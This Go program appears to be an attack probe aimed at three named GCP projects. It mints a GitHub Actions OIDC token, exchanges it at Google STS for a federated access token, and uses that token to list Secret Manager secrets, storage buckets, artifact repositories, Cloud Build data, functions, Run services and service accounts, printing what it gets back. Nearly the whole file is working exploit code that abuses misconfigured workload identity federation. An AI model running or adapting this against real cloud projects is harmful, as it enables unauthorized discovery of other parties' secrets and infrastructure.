package main

// Intent 42542 probe: mint real GitHub OIDC JWT -> STS exchange -> use the
// FEDERATED token DIRECTLY (no SA impersonation) to enumerate project-scoped
// GCP resources, testing whether the WIF principalSet has any direct
// resource-level role binding. READ-ONLY on target. No writes.

import (
	"bytes"
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"net/url"
	"os"
	"strings"
	"time"
)

var client = &http.Client{Timeout: 45 * time.Second}

type tgt struct {
	num    string
	projID string
	prov   string
}

var targets = []tgt{
	{"507686559040", "devops-828f86cd", "//iam.googleapis.com/projects/507686559040/locations/global/workloadIdentityPools/github-actions/providers/gh-provider"},
	{"202458047894", "devops-7743e969", "//iam.googleapis.com/projects/202458047894/locations/global/workloadIdentityPools/github-actions/providers/gh-provider"},
	{"597679076120", "devops-f467c7d5", "//iam.googleapis.com/projects/597679076120/locations/global/workloadIdentityPools/github-actions/providers/gh-provider"},
}

func httpDo(method, u, bearer string, body []byte) (int, string) {
	var rdr io.Reader
	if body != nil {
		rdr = bytes.NewReader(body)
	}
	req, err := http.NewRequest(method, u, rdr)
	if err != nil {
		return 0, "req-err:" + err.Error()
	}
	if bearer != "" {
		req.Header.Set("Authorization", "Bearer "+bearer)
	}
	if body != nil {
		req.Header.Set("Content-Type", "application/json")
	}
	resp, err := client.Do(req)
	if err != nil {
		return 0, "do-error:" + err.Error()
	}
	defer resp.Body.Close()
	b, _ := io.ReadAll(resp.Body)
	return resp.StatusCode, string(b)
}

func trim(s string, n int) string {
	s = strings.ReplaceAll(s, "\n", " ")
	s = strings.ReplaceAll(s, "\t", " ")
	for strings.Contains(s, "  ") {
		s = strings.ReplaceAll(s, "  ", " ")
	}
	if len(s) > n {
		return s[:n]
	}
	return s
}

func mintJWT(aud string) string {
	reqURL := os.Getenv("ACTIONS_ID_TOKEN_REQUEST_URL")
	reqTok := os.Getenv("ACTIONS_ID_TOKEN_REQUEST_TOKEN")
	if reqURL == "" {
		return ""
	}
	u := reqURL + "&audience=" + url.QueryEscape(aud)
	req, _ := http.NewRequest("GET", u, nil)
	req.Header.Set("Authorization", "bearer "+reqTok)
	resp, err := client.Do(req)
	if err != nil {
		return ""
	}
	defer resp.Body.Close()
	b, _ := io.ReadAll(resp.Body)
	var o struct {
		Value string `json:"value"`
	}
	json.Unmarshal(b, &o)
	return o.Value
}

func main() {
	fmt.Println("=== INTENT42542 DIRECT-FEDERATED PROBE START ===")
	for _, t := range targets {
		fmt.Println("###### PROJECT", t.num, "id=", t.projID)
		jwt := mintJWT(t.prov)
		if jwt == "" {
			fmt.Println("  MINT_FAIL")
			continue
		}
		body, _ := json.Marshal(map[string]string{
			"audience":           t.prov,
			"grantType":          "urn:ietf:params:oauth:grant-type:token-exchange",
			"requestedTokenType": "urn:ietf:params:oauth:token-type:access_token",
			"scope":              "https://www.googleapis.com/auth/cloud-platform",
			"subjectTokenType":   "urn:ietf:params:oauth:token-type:jwt",
			"subjectToken":       jwt,
		})
		st, sb := httpDo("POST", "https://sts.googleapis.com/v1/token", "", body)
		var tok struct {
			AccessToken string `json:"access_token"`
		}
		json.Unmarshal([]byte(sb), &tok)
		fmt.Printf("  STS=%d federated_len=%d :: %s\n", st, len(tok.AccessToken), trim(sb, 160))
		if tok.AccessToken == "" {
			continue
		}
		ft := tok.AccessToken

		probes := []struct{ name, u string }{
			{"SM.secretsID", "https://secretmanager.googleapis.com/v1/projects/" + t.projID + "/secrets"},
			{"SM.secretsNum", "https://secretmanager.googleapis.com/v1/projects/" + t.num + "/secrets"},
			{"GCS.bucketsID", "https://storage.googleapis.com/storage/v1/b?project=" + t.projID},
			{"GCS.bucketsNum", "https://storage.googleapis.com/storage/v1/b?project=" + t.num},
			{"AR.repos", "https://artifactregistry.googleapis.com/v1/projects/" + t.projID + "/locations/-/repositories"},
			{"AR.reposNum", "https://artifactregistry.googleapis.com/v1/projects/" + t.num + "/locations/-/repositories"},
			{"GCR.tags", "https://gcr.io/v2/_catalog?project=" + t.projID},
			{"CB.builds", "https://cloudbuild.googleapis.com/v1/projects/" + t.projID + "/builds?pageSize=10"},
			{"CB.triggers", "https://cloudbuild.googleapis.com/v1/projects/" + t.projID + "/triggers?pageSize=10"},
			{"CF.functions", "https://cloudfunctions.googleapis.com/v1/projects/" + t.projID + "/locations/-/functions"},
			{"CR.services", "https://run.googleapis.com/v1/projects/" + t.projID + "/locations/-/services"},
			{"CRM.project", "https://cloudresourcemanager.googleapis.com/v1/projects/" + t.projID},
			{"IAM.sa", "https://iam.googleapis.com/v1/projects/" + t.projID + "/serviceAccounts"},
			{"IAM.eworkloadPool", "https://iam.googleapis.com/v1/projects/" + t.num + "/locations/global/workloadIdentityPools"},
			{"TOKENINFO", "https://oauth2.googleapis.com/tokeninfo?access_token=" + ft},
		}
		for _, p := range probes {
			c, b := httpDo("GET", p.u, ft, nil)
			fmt.Printf("  PROBE %-16s %d :: %s\n", p.name, c, trim(b, 220))
			time.Sleep(300 * time.Millisecond)
		}
	}
	fmt.Println("=== INTENT42542 DIRECT-FEDERATED PROBE END ===")
}
